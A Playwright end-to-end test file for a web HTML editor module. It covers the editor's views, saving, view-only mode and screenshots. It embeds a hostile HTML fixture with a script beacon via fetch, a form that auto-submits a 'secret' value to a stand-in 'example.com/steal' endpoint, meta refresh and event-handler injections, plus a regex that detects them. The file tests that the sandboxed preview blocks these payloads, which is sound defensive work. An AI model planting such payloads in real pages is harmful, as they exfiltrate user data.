// GO-B4 H-1/H-2 (UNI-1014): the HTML module frame end to end on the production build
// (`npm run build:web -- --module html`) in the protocol test host, under its CSP header:
// source <-> split <-> preview, edit, save (bytes), reopen, a hostile document whose script, form,
// javascript: link, remote image and meta refresh must neither run nor send a request (static
// preview, lane decision P1), view only. Zero console errors, CSP violations or off-origin
// requests; screenshots light + dark, vi + en into docs/web-modules/screenshots/html/.
// Run: npx playwright test -c web/e2e html-web
import { test, expect, type Frame, type Page } from '@playwright/test'
import {
  BOM,
  built,
  concat,
  cspViolations,
  encode,
  hostState,
  openModule,
  reloadFrame,
  screenshotPath,
  serveFixture,
  watch,
  type Problems,
} from './text-modules'

const PAGE = [
  '<!doctype html>',
  '<html lang="en">',
  '  <head>',
  '    <meta charset="utf-8" />',
  '    <title>UniWork HTML web fixture</title>',
  '    <style>body { font-family: sans-serif; margin: 32px; } h1 { color: #185abd; }</style>',
  '  </head>',
  '  <body>',
  '    <h1>UniWork HTML web fixture</h1>',
  '    <p>A paragraph with <strong>bold</strong> text.</p>',
  '  </body>',
  '</html>',
  '',
].join('\r\n')
const FIXTURE = concat(BOM, encode(PAGE))
const EDITED = concat(BOM, encode(PAGE.replace('text.</p>', 'text.</p> Edited on the web.')))

const HOSTILE = [
  '<!doctype html>',
  '<html><head>',
  '<meta http-equiv="refresh" content="1;url=https://example.com/refreshed">',
  '<base href="https://example.com/">',
  '<link rel="stylesheet" href="https://example.com/remote.css">',
  '<style>@import url("https://example.com/imported.css"); body { background: url(https://example.com/bg.png) }</style>',
  '<script>document.title = "script ran"; fetch("https://example.com/beacon")</script>',
  '<script src="https://example.com/remote.js"></script>',
  '</head><body onload="document.body.dataset.ran = 1">',
  '<h1>Hostile fixture</h1>',
  '<img src="https://example.com/pixel.png" alt="remote image" onerror="this.alt = \'handler ran\'">',
  '<a id="js" href="javascript:document.title=\'link ran\'">javascript link</a>',
  '<form id="f" action="https://example.com/steal" method="post"><input name="q" value="secret"></form>',
  '<script>document.getElementById("f").submit()</script>',
  '<iframe src="https://example.com/embedded"></iframe>',
  '</body></html>',
  '',
].join('\n')

test.skip(!built('html'), 'no dist-web/html build: npm run build:web -- --module html')

const PAGE_PATH = '/e2e-fixtures/Page.html'
const HOSTILE_PATH = '/e2e-fixtures/Hostile.html'

/** the document is loaded (the renderer opens in Preview by default) */
async function ready(frame: Frame) {
  await expect(frame.locator('.workspace')).toBeVisible({ timeout: 30_000 })
  await expect.poll(() => previewSrcdoc(frame), { timeout: 30_000 }).toMatch(/<h1[ >]/)
}

async function view(frame: Frame, name: RegExp, mode: string) {
  await frame.getByRole('tab', { name }).click()
  await expect(frame.locator(`.workspace.view-${mode}`)).toBeVisible()
}

function previewSrcdoc(frame: Frame) {
  return frame.locator('iframe.preview-frame').getAttribute('srcdoc')
}

async function expectClean(page: Page, frame: Frame, problems: Problems) {
  const csp = await cspViolations(page, frame)
  expect({ csp, ...problems }).toEqual({ csp: [], console: [], page: [], http: [], external: [] })
}

test('html: views, edit, save, reopen', async ({ page }) => {
  const problems = await watch(page)
  await serveFixture(page, PAGE_PATH, FIXTURE, 'text/html')
  let frame = await openModule(page, 'html', { open: PAGE_PATH, lang: 'en' })
  await ready(frame)
  // web: no AI, no AutoSave toggle
  expect(await frame.locator('.ai-dock, .ai-entry, .autosave-toggle').count()).toBe(0)

  // the preview is static: srcdoc, empty sandbox, credentialless
  const iframe = frame.locator('iframe.preview-frame')
  await expect(iframe).toHaveAttribute('sandbox', '')
  await expect(iframe).toHaveAttribute('credentialless', '')
  await expect.poll(() => previewSrcdoc(frame)).toContain('UniWork HTML web fixture')

  await view(frame, /^Source$/, 'source')
  await expect(frame.locator('.cm-content')).toBeVisible()
  await view(frame, /^Split$/, 'split')
  await view(frame, /^Preview$/, 'preview')
  await view(frame, /^Split$/, 'split')

  // edit in the source pane: after the paragraph
  await frame.locator('.cm-line', { hasText: 'A paragraph with' }).click()
  await page.keyboard.press('End')
  await page.keyboard.type(' Edited on the web.')
  await expect.poll(() => previewSrcdoc(frame), { timeout: 10_000 }).toContain('Edited on the web.')
  await page.keyboard.press('Control+s')
  await expect.poll(async () => (await hostState(page)).lastSaved?.versionId).toBe('v2')
  expect((await hostState(page)).lastSaved!.bytes).toEqual(Array.from(EDITED))

  // reopen: the latest version, and a save without edits is byte-identical
  frame = await reloadFrame(page)
  await ready(frame)
  await view(frame, /^Split$/, 'split')
  await expect(frame.locator('.cm-content')).toContainText('Edited on the web.')
  await frame.locator('.cm-content').click()
  await page.keyboard.press('Control+s')
  await expect.poll(async () => (await hostState(page)).lastSaved?.versionId).toBe('v3')
  expect((await hostState(page)).lastSaved!.bytes).toEqual(Array.from(EDITED))

  await page.waitForTimeout(1_000)
  await expectClean(page, frame, problems)
})

test('html: a hostile document neither runs nor sends a request', async ({ page }) => {
  const problems = await watch(page)
  await serveFixture(page, HOSTILE_PATH, encode(HOSTILE), 'text/html')
  const frame = await openModule(page, 'html', { open: HOSTILE_PATH, lang: 'en' })
  await ready(frame)
  await view(frame, /^Preview$/, 'preview')
  await expect.poll(() => previewSrcdoc(frame)).toContain('Hostile fixture')
  const srcdoc = (await previewSrcdoc(frame))!
  expect(srcdoc).not.toMatch(
    /<script|onload=|onerror=|http-equiv|<base|<iframe|javascript:|example\.com/i,
  )

  // give a meta refresh / script / form submit time to act, then click the javascript: link
  await page.waitForTimeout(2_500)
  const preview = page.frames().find((f) => f.parentFrame() === frame)!
  expect(preview.url()).toBe('about:srcdoc')
  await frame.locator('iframe.preview-frame').contentFrame().locator('#js').click()
  await page.waitForTimeout(500)
  expect(preview.url()).toBe('about:srcdoc')
  // the frame itself is untouched (title is the host's file name, no script ran anywhere)
  expect(await frame.evaluate(() => document.title)).not.toMatch(/ran/)
  await page.screenshot({ path: screenshotPath('html', 'hostile-preview-light-en') })
  await expectClean(page, frame, problems)
})

test('html: view only without the save grant', async ({ page }) => {
  const problems = await watch(page)
  await serveFixture(page, PAGE_PATH, FIXTURE, 'text/html')
  const frame = await openModule(page, 'html', { open: PAGE_PATH, lang: 'en', readonly: '1' })
  await ready(frame)
  await expect(frame.locator('.status-view-only')).toHaveText('View only')
  await view(frame, /^Source$/, 'source')
  await frame.locator('.cm-line', { hasText: 'A paragraph with' }).click()
  await page.keyboard.type('typed')
  await page.keyboard.press('Control+s')
  await page.waitForTimeout(1_000)
  await expect(frame.locator('.cm-content')).not.toContainText('typed')
  expect((await hostState(page)).lastSaved).toBeNull()
  await page.screenshot({ path: screenshotPath('html', 'view-only-light-en') })
  await expectClean(page, frame, problems)
})

for (const theme of ['light', 'dark'] as const) {
  for (const lang of ['en', 'vi'] as const) {
    test(`html: screenshot ${theme} ${lang}`, async ({ page }) => {
      const problems = await watch(page)
      await serveFixture(page, PAGE_PATH, FIXTURE, 'text/html')
      const frame = await openModule(page, 'html', { open: PAGE_PATH, lang, theme })
      await ready(frame)
      await frame.locator('.workspace').waitFor()
      await frame.getByRole('tab').nth(1).click()
      await expect(frame.locator('.workspace.view-split')).toBeVisible()
      await expect
        .poll(() => frame.evaluate(() => document.documentElement.lang))
        .toMatch(new RegExp(`^${lang}`))
      await page.waitForTimeout(1_500)
      await page.screenshot({ path: screenshotPath('html', `split-${theme}-${lang}`) })
      await expectClean(page, frame, problems)
    })
  }
}
